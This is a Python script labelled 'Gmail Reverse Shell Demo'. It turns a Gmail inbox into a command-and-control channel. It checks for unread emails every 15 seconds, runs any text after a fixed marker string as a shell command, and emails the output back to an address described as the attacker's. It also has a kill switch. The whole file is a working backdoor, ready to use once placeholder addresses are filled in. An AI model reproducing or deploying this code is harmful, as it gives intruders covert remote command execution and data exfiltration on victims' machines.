#Make sure to change the appropriate 'to' and 'from' emails in CreateMessage()


from __future__ import print_function
import httplib2
import os
import email
import base64
import subprocess
import threading

from HTMLParser import HTMLParser
from apiclient import discovery
from oauth2client import client
from oauth2client import tools
from oauth2client.file import Storage
from email.mime.text import MIMEText

try:
    import argparse
    flags = argparse.ArgumentParser(parents=[tools.argparser]).parse_args()
except ImportError:
    flags = None

SCOPES = ['https://www.googleapis.com/auth/gmail.readonly','https://www.googleapis.com/auth/gmail.modify', 'https://www.googleapis.com/auth/gmail.send']
CLIENT_SECRET_FILE = 'client_secret.json'
APPLICATION_NAME = 'Gmail Reverse Shell Demo'


def get_credentials():

    home_dir = os.path.expanduser('~')
    credential_dir = os.path.join(home_dir, '.credentials')
    if not os.path.exists(credential_dir):
        os.makedirs(credential_dir)
    credential_path = os.path.join(credential_dir,
                                   'creds.json')

    store = Storage(credential_path)
    credentials = store.get()
    if not credentials or credentials.invalid:
        flow = client.flow_from_clientsecrets(CLIENT_SECRET_FILE, SCOPES)
        flow.user_agent = APPLICATION_NAME
        if flags:
            credentials = tools.run_flow(flow, store, flags)
        else: # Needed only for compatibility with Python 2.6
            credentials = tools.run(flow, store)
        print('Storing credentials to ' + credential_path)
    return credentials


credentials = get_credentials()
http = credentials.authorize(httplib2.Http())
service = discovery.build('gmail', 'v1', http=http)

def GetMessage(service, user_id, msg_id):
    hp = HTMLParser()

    message = service.users().messages().get(userId=user_id, id=msg_id).execute()

    return hp.unescape(message['snippet'])



def ModifyMessage(service, user_id, msg_id):
    msg_labels = {
      "removeLabelIds": [
        "UNREAD"
      ]
    }

    message = service.users().messages().modify(userId=user_id, id=msg_id,
                                                body=msg_labels).execute()

    return message




def ListMessages(service, user_id, label_ids):

    response = service.users().messages().list(userId=user_id,
                                               labelIds=label_ids).execute()
    messages = []
    if 'messages' in response:
      messages.extend(response['messages'])

    while 'nextPageToken' in response:
      page_token = response['nextPageToken']
      response = service.users().messages().list(userId=user_id,
                                                 labelIds=label_ids,
                                                 pageToken=page_token).execute()
      messages.extend(response['messages'])

    return messages



def SendMessage(service, user_id, message):

    message = (service.users().messages().send(userId=user_id, body=message)
               .execute())
    return message


def CreateMessage(subject, message_text):

  message = MIMEText(message_text)
  message['to'] = 'EMAIL ADDRESS THE OUTPUT GETS SENT BACK TO'
  message['from'] = 'EMAIL ADDRESS YOU SETUP GMAIL API UNDER'
  message['subject'] = subject
  return {'raw': base64.urlsafe_b64encode(message.as_string())}


def main():
    #run main every 15 seconds aka check inbox for new messages every 15 seconds
    t = threading.Timer(15.0, main)
    t.start()

    #List unread messages from inbox
    messages = ListMessages(service,'me','UNREAD')
    try:
        #use first id from ListMessages to get email body, if it fails, means no new messages in mailbox
        command = GetMessage(service, 'me', messages[0]['id'])

        #check for kill message in email body
        if 'N98NAH63HD52: KILL' in command:
            #mark message as read and kill the thread
            ModifyMessage(service, 'me', messages[0]['id'])
            print ("KILLED")
            t.cancel()

        #check for identifier to filter it out from other emails in mailbox
        elif 'N98NAH63HD52:' in command:
            #mark the current message as READ
            ModifyMessage(service, 'me', messages[0]['id'])
            print ("Command -> "+command)

            #create subprocess, parse out command and execute
            p = subprocess.Popen(command.split('N98NAH63HD52:')[1],stdout=subprocess.PIPE,shell=True)
            response = p.communicate()

            #construct the email message with the output from executed command and get ready to send
            body = CreateMessage(command, response[0])

            #send email back to 'attacker'
            SendMessage(service, 'me', body)
        else:
            #If new message doesn't contain identifier, mark as read
            ModifyMessage(service, 'me', messages[0]['id'])
    except:
        print ("No new messages")


if __name__ == '__main__':

    main()






